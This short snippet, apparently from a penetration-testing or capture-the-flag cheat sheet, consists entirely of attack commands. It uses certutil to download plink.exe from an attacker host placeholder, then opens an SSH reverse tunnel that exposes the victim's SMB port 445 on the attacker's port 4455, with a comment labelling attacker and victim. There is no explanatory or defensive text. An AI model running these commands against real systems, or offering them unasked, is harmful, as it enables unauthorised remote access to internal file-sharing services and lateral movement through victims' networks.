```
certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe
cmd /c echo y | .\plink.exe -ssh -l root -pw <SSH_PASS> \
    -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>
# Attacker's 4455 → victim's 445
```